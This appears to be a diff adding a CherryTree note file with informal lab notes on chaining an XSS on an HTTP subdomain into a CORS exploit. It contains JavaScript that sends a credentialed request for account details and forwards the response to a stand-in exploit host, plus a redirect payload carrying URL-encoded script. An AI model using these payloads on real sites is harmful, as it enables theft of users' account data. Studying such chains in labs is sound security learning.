@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="34" master_id="0" name="CORS: TLS Break" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747510709" ts_lastsave="1747526714">
+    <rich_text>This is a chain of a XSS into http tls break subdomain cors:
+
+1. find xss vuln.
+	Test both parameters - john shows so first is vuln to xss
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+2. Find cors vuln:
+	nothing worked, not any, not null, not even same page
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+3. But with http it worrks!!
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+4. Also http hosted on any site and just checks parameters after.
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+5. Write script again:
+
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+But now since we cant call it directly we have to put the exploit withing another script that actually calls the unsafe http side and pass script 1 as parameter for the XSS.
+also make sure to url encode:
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <encoded_png char_offset="139" justification="left" link="" sha256sum="c91d732d594171d01e3901adde5cbbc200bf542d8ec39c589554c1bfd7498592"/>
+    <encoded_png char_offset="216" justification="left" link="" sha256sum="1a8d964ea528619f73c276690966aa14cfee695a9f13132a2c5cd50a2d3790b8"/>
+    <encoded_png char_offset="248" justification="left" link="" sha256sum="f485eca28f4ff28652028faf533f00de5100601edf764481dbfb2c2e6a2e25c5"/>
+    <encoded_png char_offset="317" justification="left" link="" sha256sum="5b826673ef5f6533d72049517c141bc46878ca65d844d598671b7133e0f0919d"/>
+    <codebox char_offset="345" justification="left" frame_width="1971" frame_height="100" width_in_pixels="1" syntax_highlighting="js" highlight_brackets="1" show_line_numbers="0">&lt;script&gt;&#13;
+    const request = new XMLHttpRequest()&#13;
+    request.open("get", "https://vuln-url/accountDetails", true )&#13;
+&#13;
+    request.onload = () =&gt; {&#13;
+        window.location = "https://exploit-url-net/exploit/log?key=" + request.responseText&#13;
+    }&#13;
+    request.withCredentials = true &#13;
+    request.send()&#13;
+&lt;/script&gt;</codebox>
+    <codebox char_offset="553" justification="left" frame_width="1971" frame_height="100" width_in_pixels="1" syntax_highlighting="js" highlight_brackets="1" show_line_numbers="0">&lt;script&gt;&#13;
+    window.location = "http(not https!!!)url-thats-vuln to XSS + in safe origin?=&lt;script&gt;URL ENCODED3%72%69%70%74%3e&amp;storeId=1"&#13;
+&lt;/script&gt;
+</codebox>
+  </node>
+</cherrytree>
